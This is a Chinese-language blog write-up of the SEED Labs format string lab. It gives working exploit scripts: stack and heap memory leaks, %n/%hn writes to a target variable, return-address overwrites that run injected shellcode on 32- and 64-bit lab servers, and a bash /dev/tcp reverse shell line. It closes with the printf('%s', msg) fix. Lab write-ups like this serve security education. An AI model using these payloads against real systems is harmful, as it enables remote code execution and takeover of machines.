@@ -1,0 +1,488 @@
+---
+layout:     post   				    
+title:      SeedLab3 Format String			
+subtitle:   
+date:       2022-05-05 				
+author:     慕念 						
+header-img: img/seed_labs_b.png	
+catalog: true 						
+tags:								
+    - SeedLab
+---
+
+## Task 1: Crashing the Program
+
+首先发送一条benign message，看target container的输出：
+
+```terminal
+echo hello | nc 10.9.0.5 9090
+```
+
+![image-20220421145944067](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207012317965.png)
+
+task1要求crash the program，只需要输入`%s`即可，因为`printf`会将栈上的数据解析指针访问地址，即读了不可读的内容，所以会产生报错，程序崩溃：
+
+```terminal
+echo %s | nc 10.9.0.5 9090
+```
+
+![image-20220421145823915](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207012317266.png)
+
+
+
+## Task 2: Printing Out the Server Program’s Memory
+
+栈的分布图:
+
+<img src="stack.jpg" style="zoom:80%;" />
+
+### Task 2.A: Stack Data
+
+构造输入payload：
+
+```terminal
+echo AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p | nc 10.9.0.5 9090
+```
+
+`printf`中占位符`%p`的作用是将所指向的数据地址以十六进制的形式输出。所以当`printf`解析到第一个%p时会从栈顶指针esp+0x4的位置开始打印出栈上的数据，之后依次类推：
+
+![image-20220421200232373](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220421200232373.png)
+
+可以发现第一个`%p`打印出来的就是程序中输出的`target variable’s value: 0x11223344`，在第64个偏移处打印了`0x41414141`即输入的AAAA。说明输入的payload被保存在距离esp第64个偏移处（即buffer的起始地址）。
+
+并且在打印出的stack data张可以发现有3个`0xffffd3b0`，是main函数中`buf`的地址，分别是call `dummy_function`,`myprintf`和`printf`时作为参数压入栈中，中间大量的`nil`是在`dummy_function`中通过`memset`填充的0。
+
+
+
+### Task 2.B: Heap Data
+
+由之前打印出来的信息可以知道secret message的地址是：`0x080b4008`，buffer的地址距离esp有64个偏移。
+
+构造Payload:（这里可以没有abcd）
+
+```python
+#!/usr/bin/python3
+import sys
+
+# Initialize the content array
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+# This line shows how to store a 4-byte integer at offset 0
+number  = 0x080b4008	# 把secret message的地址放在buffer开头
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+
+# This line shows how to store a 4-byte string at offset 4
+content[4:8]  =  ("abcd").encode('latin-1')
+
+# This line shows how to construct a string s with 12 of "%.8x", concatenated with a "%n"
+s = "%.8x"*63 + "%s"	# 因为第64个是buffer的起始地址，所以先填63个%.8x(%p也可以)，第64个填%s输出字符串
+
+# The line shows how to store the string s at offset 8
+fmt  = (s).encode('latin-1')
+content[8:8+len(fmt)] = fmt
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+```terminal
+python3 build_string.py 
+cat badfile | nc 10.9.0.5 9090
+```
+
+成功输出secret message：
+
+![image-20220421201731894](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220421201731894.png)
+
+
+
+## Task 3: Modifying the Server Program’s Memory
+
+### Task 3.A: Change the value to a different value
+
+要求只要修改target变量的值就可以了，所以可以用`%n`占位符，作用是计算到目前为止输出的字节数，写入对应的参数指定的内存地址。
+
+所以用`target`的地址`0x080e5068`填充在buffer的起始地址，并且在第64个偏移处填`%n`
+
+```python
+# This line shows how to store a 4-byte integer at offset 0
+number  = 0x080e5068	# target的地址
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+
+# This line shows how to store a 4-byte string at offset 4
+content[4:8]  =  ("abcd").encode('latin-1')
+
+# This line shows how to construct a string s with 12 of "%.8x", concatenated with a "%n"
+s = "%.8x"*63 + "%n"	# s = "%.8x"*63 +"%64$n" 也可以
+```
+
+测试成功，`target`的值被改成了0x200，因为在`%n`之前打印了4位宽target变量地址+4位宽的abcd+8位宽的`%.8x`*63，即$0x4+0x4+0x8\times63=0x200$。
+
+![image-20220421202710777](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220421202710777.png)
+
+
+
+### Task 3.B: Change the value to 0x5000
+
+按照相同的思路，由于第64个偏移处必须填`%n`，只能想办法扩展前面部分的宽度，所以payload构造为：$address+abcd+\%.8x\times62+\%.19976x$
+
+```python
+# This line shows how to construct a string s with 12 of "%.8x", concatenated with a "%n"
+s = "%.8x"*62 + "%.19976x" + "%n"
+```
+
+成功将值改成0x5000：
+
+![image-20220421205113015](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220421205113015.png)
+
+
+
+### Task 3.C: Change the value to 0xAABBCCDD
+
+这次要修改的值非常大，所以没有办法像上面那样直接用`%n`写入，需要拆分成两部分通过`%hn`每次写入2bytes。由于0xAABBCCDD正好是递增的，可以直接先前2个byte写0xAABB，后2个byte写0xCCDD：
+
+$0xAABB-4-4-4-62\times8=43199$
+
+$0xCCDD-0xAABB=8738$（`%hn`不占位置）
+
+并且由于是小端法，低位放在低地址，$0xCCDD$放在number处，高位在高地址，$0xAABB$放在number+2处。
+
+整体payload：$target高2位地址+abcd（junk填充字节）+target低2位地址+format\ string$
+
+format string：`s = "%.8x"*62 + "%.43199x" + "%hn" +"%.8738x"+"%hn"  # 0xAABB + %x +0xCCDD`
+
+```python
+#!/usr/bin/python3
+import sys
+
+# Initialize the content array
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+# This line shows how to store a 4-byte integer at offset 0
+number = 0x080e5068  # target地址（小端法，读两个字节就是0x5068）
+number2 = number+2  # target前2个字节地址
+# little-endian
+content[0:4] = (number2).to_bytes(4, byteorder='little')  # high addr:0xAABB
+content[8:12] = (number).to_bytes(4, byteorder='little')  # low addr:0xCCDD 因为payload中间有一个"%.8738x"，所以要放在8:12的位置
+
+# This line shows how to store a 4-byte string at offset 4
+content[4:8] = ("abcd").encode('latin-1')
+
+# This line shows how to construct a string s with 12 of "%.8x", concatenated with a "%n"
+s = "%.8x"*62 + "%.43199x" + "%hn" +"%.8738x"+"%hn"  # 0xAABB + %x +0xCCDD
+
+# The line shows how to store the string s at offset 8
+fmt = (s).encode('latin-1')
+content[12:12+len(fmt)] = fmt	# 向后移动改成12
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+    f.write(content)
+```
+
+成功输出：
+
+![image-20220421215702222](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220421215702222.png)
+
+
+
+## Task 4: Inject Malicious Code into the Server Program
+
+<img src="C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220421223013262.png" alt="image-20220421223013262" style="zoom:80%;" />
+
+### Question 1
+
+> What are the memory addresses at the locations marked by ➋ and ➌?
+
+A:
+
+②处是call`myprintf`时，压入的return to dummy_fuction的`return address`，程序打印出了`myprintf`中的ebp的值：
+
+```c
+    unsigned int *framep;
+    // Save the ebp value into framep
+    asm("movl %%ebp, %0" : "=r"(framep));
+    printf("Frame Pointer (inside myprintf):      0x%.8x\n", (unsigned int) framep);
+```
+
+![image-20220421224647416](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220421224647416.png)
+
+所以$return\ address=ebp+4=0xffffd2d8+4=0xffffd2dc$（即距离buffer起始位置53个偏移）
+
+③处是main中`buf[]`的起始地址，程序直接打印出了地址：`0xffffd3b0`
+
+![image-20220421223449305](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220421223449305.png)
+
+
+
+### Question 2
+
+> How many `%x` format specififiers do we need to move the format string argument pointer to ➌? Remember, the argument pointer starts from the location above ➊.
+
+A：根据Task2.A可以知道需要填充64个`%x`才能移动到③。
+
+
+
+### task: run shellcode
+
+(容器重启了，改变了地址，所以会和上面地址不一样)
+
+![image-20220430134807059](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430134807059.png)
+
+**思路：把`myprintf`的return address改成shellcode的地址**
+
+- `myprintf()`的返回地址：$0xffffd3c8+0x4=0xffffd3cc$
+
+- `shellcode`填充在` buf`的最顶上：
+
+  ```python
+  # Put the shellcode somewhere in the payload
+  start = 1500-len(shellcode)              # Change this number
+  content[start:start + len(shellcode)] = shellcode
+  print(start)
+  ```
+
+  打印start，获得`shellcode`的起始位置是：$buf\ addr+1364=0xffffd4a0+1364=0xffffd9f4$
+
+  ![image-20220430135300950](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430135300950.png)
+
+- 要把$0xffffd3cc$改成$0xffffd9f4$，数字比较大，像上面task3.c一样分成两步：
+  - $0xffff-4-4-4-62\times8=65027$，所以`s = "%.8x"*62 + "%.65027x" + "%hn"`
+  - $0x1d9f4-0xffff=55797$，所以`s += "%.55797x" + "%hn"`（利用整数溢出）
+
+具体Payload：
+
+$myprintf高两位的地址+junk(4B)+myprintf低两位的地址+format\ string+NOP*n+shellcode$
+
+```python
+N = 1500
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(N))
+
+# Choose the shellcode version based on your target
+shellcode = shellcode_32
+
+# Put the shellcode somewhere in the payload
+start = 1500-len(shellcode)              # Change this number
+content[start:start + len(shellcode)] = shellcode
+print(start)	# start=1364
+
+############################################################
+
+# This line shows how to store a 4-byte integer at offset 0
+number = 0xffffd3cc  # myprintf return address低四位 0xd3c8
+content[8:12] = (number).to_bytes(4, byteorder='little')
+number2 = number+2  # 高四位 0xffff	
+content[0:4] = (number2).to_bytes(4, byteorder='little')
+
+# This line shows how to store a 4-byte string at offset 4
+content[4:8] = ("abcd").encode('latin-1')
+
+# This line shows how to construct a string s with 12 of "%.8x", concatenated with a "%n"
+s = "%.8x"*62 + "%.65027x" + "%hn"	# 先改成0xffff
+s += "%.55797x" + "%hn"	# 再改成0xd
+
+# The line shows how to store the string s at offset 8
+fmt = (s).encode('latin-1')
+content[12:12+len(fmt)] = fmt
+############################################################
+
+# Save the format string to file
+with open('badfile', 'wb') as f:
+    f.write(content)
+```
+
+测试成功：
+
+![image-20220430142449060](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430142449060.png)
+
+#### reverse shell
+
+把shellcode修改成reverse shell：
+
+```python
+"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
+```
+
+测试成功：
+
+![image-20220430143426157](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430143426157.png)
+
+![image-20220430143526901](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430143526901.png)
+
+
+
+## Task 5: Attacking the 64-bit Server Program
+
+> **Challenges caused by 64-bit Address.** 
+>
+> 因为之前将地址放在format string前面，在64位的机器中，由于用户空间的地址高两位都是0，当`printf()`遇到地址中的`\0`时停止解析format string。
+>
+> ![image-20220430165913977](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430165913977.png)
+>
+
+`echo hello | nc 10.9.0.6 9090`：
+
+![image-20220430145620327](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430145620327.png)
+
+首先构造payload判断偏移，offset=34，说明buffer的起始位置在距离esp第34个偏移处
+
+```terminal
+echo AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p | nc 10.9.0.6 9090
+```
+
+![image-20220430145803224](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430145803224.png)
+
+（同样的程序，比起32位机器上偏移少了很多，猜测是因为32位中函数的参数也放在栈上，64位中参数放在寄存器中）
+
+
+
+和32位的程序一样，为了运行shellcode，**要把`myprintf`的return address改成shellcode的地址**。
+
+- shellcode还是放在buf的最顶上：
+
+  ```python
+  # Put the shellcode somewhere in the payload
+  start = 1500-len(shellcode)
+  content[start:start + len(shellcode)] = shellcode
+  ```
+
+  可以打印出shellcode的起始地址：`0x00007fffffffe907`
+
+  ```python
+  shell_code_addr = buf_addr + 1500 - len(shellcode) # shellcode起始地址
+  print('%#x'%shell_code_addr)
+  ```
+
+  ![image-20220430154413985](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430154413985.png)
+
+- `myprintf`的return address$=ebp+8=0x00007fffffffe318$
+
+  ```python
+  ebp_addr = 0x00007fffffffe310	# myprintf ebp的地址
+  ret_addr = ebp_addr + 0x8 # myprint return address
+  ```
+
+- 目标是把`0x00007fffffffe318`改成`0x00007fffffffe907`，同样通过`%hn`2字节一改：
+
+  - 按照从小到大的顺序改，0x7fff→0xe907→0xffff（方便起见，就不用溢出了）
+
+    ```python
+    s1 = 0xe907  # shell_code_addr 0-16位
+    s1_addr = ret_addr
+    s2 = 0xffff  # 16-32位
+    s2_addr=ret_addr+0x2
+    s3 = 0x7fff  # 32-48位
+    s3_addr=ret_addr+0x4
+    # 最高16位全0
+    ```
+    
+    format string：（中间的00表示还未确定，`%x$hn`可以指定栈上的第几个偏移量）
+    
+    ```python
+    s = "%." + str(0x7fff) + "x" + "%00$hn" + "%." + str(0xe907-0x7fff) + "x" + "%00$hn" + "%." + str(0xffff-0xe907) + "x" + "%00$hn"
+    ```
+  
+    - 为了避免地址中的`\0`影响format string的解析，把地址放在format string后面。之前已经得出`buf[]`的offset是34，所以地址的偏移应该是两位数，先用00占位子打印出`fmt`的长度为41bytes。
+  
+      ```python
+      fmt = (s).encode('latin-1')
+      print("fmt:"+str(len(fmt)))
+      ```
+  
+      ![image-20220430162148326](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430162148326.png)
+  
+      $\lceil 41/8\rceil=6$，所以地址分别放在40(34+6)、41、42个参数的位置。format string：
+  
+      ```python
+      s = "%." + str(0x7fff) + "x" + "%40$hn" + "%." + str(0xe907-0x7fff) + "x" + "%41$hn" + "%." + str(0xffff-0xe907) + "x" + "%42$hn"
+      ```
+  
+  
+    - format string后面加上需要被改变的2字节值的地址，这里`content[48:56]`对应的就是栈上第40个偏移的位置。
+  
+      ```python
+      content[48:56] = (s3_addr).to_bytes(8, byteorder='little')	# 6*8=48，所以从第48字节开始填起
+      content[56:64] = (s1_addr).to_bytes(8, byteorder='little')
+      content[64:72] = (s2_addr).to_bytes(8, byteorder='little')
+      ```
+  
+
+完整payload:
+
+$format\ string+NOP...NOP（对齐）+地址3+地址1+地址2+NOP*n+shellcode$
+
+```python
+N = 1500
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(N))
+
+# Choose the shellcode version based on your target
+shellcode = shellcode_64
+
+# Put the shellcode somewhere in the payload
+start = 1500-len(shellcode)
+content[start:start + len(shellcode)] = shellcode
+
+############################################################
+
+buf_addr = 0x00007fffffffe3d0  # buffer起始地址
+ebp_addr = 0x00007fffffffe310  # myprintf ebp的地址
+ret_addr = ebp_addr + 0x8  # myprint return address
+
+shell_code_addr = buf_addr + 1500 - len(shellcode)  # shellcode起始地址
+# print('%#x'%shell_code_addr)
+# 0x7fffffffe907
+
+s1 = 0xe907  # shell_code_addr 0-16位
+s1_addr = ret_addr
+s2 = 0xffff  # 16-32位
+s2_addr=ret_addr+0x2
+s3 = 0x7fff  # 32-48位
+s3_addr=ret_addr+0x4
+# 最高12位全0
+
+# format string
+# 按照从小到大的顺序 0x7fff→0xe907→0xffff
+s = "%." + str(0x7fff) + "x" + "%40$hn" + "%." + str(0xe907-0x7fff) + "x" + "%41$hn" + "%." + str(0xffff-0xe907) + "x" + "%42$hn"
+fmt = (s).encode('latin-1')
+# print("fmt:"+str(len(fmt)))
+content[0:0 + len(fmt)] = fmt
+
+# format string后面加上需要被改变的2字节值的地址
+content[48:56] = (s3_addr).to_bytes(8, byteorder='little')
+content[56:64] = (s1_addr).to_bytes(8, byteorder='little')
+content[64:72] = (s2_addr).to_bytes(8, byteorder='little')
+
+############################################################
+
+# Save the format string to file
+with open('badfile', 'wb') as f:
+    f.write(content)
+```
+
+运行截图：
+
+![image-20220430163644239](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430163644239.png)
+
+
+
+## Task 6: Fixing the Problem
+
+> Remember the warning message generated by the gcc compiler? Please explain what it means. Please fix the vulnerability in the server program, and recompile it. Does the compiler warning go away? Do your attacks still work? You only need to try one of your attacks to see whether it still works or not.
+
+gcc warning：将一个非常量作为format string，且没有格式化参数
+
+![image-20220430170207744](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430170207744.png)
+
+修复漏洞：将`printf(msg);`改成`printf("%s",msg);`，这样`printf`的第一个参数format string固定下来，只会以`%s`的形式解析msg。重新编译后没有报错：
+
+![image-20220430170555801](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430170555801.png)
+
+尝试攻击修改target的值，修改失败。
+
+![image-20220430171333825](C:/Users/17166/AppData/Roaming/Typora/typora-user-images/image-20220430171333825.png)
+
